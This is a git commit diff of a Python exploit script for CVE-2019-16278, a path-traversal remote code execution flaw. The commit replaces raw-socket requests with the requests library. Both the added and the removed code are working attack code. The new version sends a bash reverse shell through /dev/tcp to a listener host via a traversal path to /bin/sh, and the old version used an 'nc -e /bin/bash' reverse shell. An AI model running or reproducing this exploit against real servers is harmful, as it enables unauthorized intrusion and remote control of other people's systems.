387fe80886cb4530b59d2e47b32b87856cc4a3a7
cocomelonc <cocomelonkz@gmail.com>
2021-03-03 10:36:46 +0600

    update CVE-2019-16278 exploit: replace socket conn to requests

--- cve_2019_16278.py
+++ cve_2019_16278.py
@@ -1,70 +1,52 @@
 import argparse
-import socket
+import requests
 import sys
 from log_colors import *
 
 # CVE-2019-16278
 class CVE2019_16278:
 
-    def __init__(self, rhost, rport, lhost, lport):
-        print (LogColors.BLUE + "target: " + rhost + ":" + rport + "..." + LogColors.ENDC)
-        self.rhost, self.rport = rhost, rport
+    def __init__(self, url, lhost, lport):
+        print (LogColors.BLUE + "target: " + url + "..." + LogColors.ENDC)
+        self.url = url.rstrip("/")
         self.lhost, self.lport = lhost, lport
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connect()
-
-    def connect(self):
-        print (LogColors.BLUE + "connecting to " + self.rhost + ":" + self.rport + "..." + LogColors.ENDC)
-        try:
-            self.sock.connect((self.rhost, int(self.rport)))
-            print (LogColors.YELLOW + self.sock.recv(100).decode() + LogColors.ENDC)
-        except Exception:
-            print (LogColors.RED + "failed to connect " + self.rhost + ":" + self.rport + LogColors.ENDC)
-            sys.exit()
+        self.s = requests.Session()
+        #self.s.headers.update({"User-Agent" : "Mozilla/5.0"})
+    
+    # prepare rev shell payload
+    def prepare_payload(self):
+        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
+        payload = '/bin/bash -c '
+        payload += '"/bin/bash -i >& /dev/tcp/{}/{} 0>&1"'.format(self.lhost, self.lport)
+        print (LogColors.YELLOW + payload + LogColors.ENDC)
+        return payload
 
     # send payload
-    def run(self, cmd):
-        print (LogColors.BLUE + "sending payload..." + LogColors.ENDC)
-        payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
-        payload += "Content-Length: 1\r\n\r\necho\necho\n"
-        payload += "%s 2>&1" % cmd
-        print (LogColors.YELLOW + payload + LogColors.ENDC)
-        payload = payload.encode("utf-8")
-        self.sock.sendall(payload)
-        print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
-        resp = ""
-        while True:
-            chunk = self.sock.recv(1024)
-            if chunk:
-                chunk = chunk.decode()
-                resp += chunk
-            else:
-                break
-        print (LogColors.YELLOW + resp + LogColors.ENDC)
-
-    # revshell
     def get_reverse_shell(self):
         print (LogColors.BLUE + "get revershe shell..." + LogColors.ENDC)
-        cmd = "nc {} {} -e /bin/bash".format(self.lhost, self.lport)
-        self.run(cmd)
+        headers = {"Content-Length" : "1"}
+        payload = self.prepare_payload()
+        try:
+            r = self.s.post(self.url + "/.%0d./.%0d./.%0d./bin/sh", data = payload)
+        except Exception as e:
+            print (LogColors.RED + "failed to get rev shell :(" + LogColors.ENDC)
+            sys.exit()
+        else:
+            print (LogColors.GREEN + "successfully get rev shell. hacked :)" + LogColors.ENDC)
+    
+    # exploitation
+    def exploit(self):
+        self.get_reverse_shell()
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('-rh','--host', required = True, help = "target host")
-    parser.add_argument('-p','--port', required = True, help = "target port")
-    parser.add_argument('-lh','--lhost', required = True, help = "revshell listener host")
-    parser.add_argument('-lp','--lport', required = True, help = "revshell listener port")
-    parser.add_argument('-c','--cmd', required = True, help = "command")
+    parser.add_argument('-u','--url', required = True, help = "target url")
+    parser.add_argument('-I','--lhost', required = True, help = "revshell listener host")
+    parser.add_argument('-P','--lport', required = True, help = "revshell listener port")
     args = vars(parser.parse_args())
-    host, port = args['host'], args['port']
+    url = args['url']
     lhost, lport = args['lhost'], args['lport']
-    cmd = args['cmd']
-    cve = CVE2019_16278(host, port, lhost, lport)
-    cve.run(cmd)
-    cve.get_reverse_shell()
-    #while True:
-    #    cmd = input('sh$ ').lower()
-    #    if (cmd == 'exit'):
-    #        sys.exit(0)
-    #    cve.run(cmd)
+    cve = CVE2019_16278(url, lhost, lport)
+    cve.exploit()
 
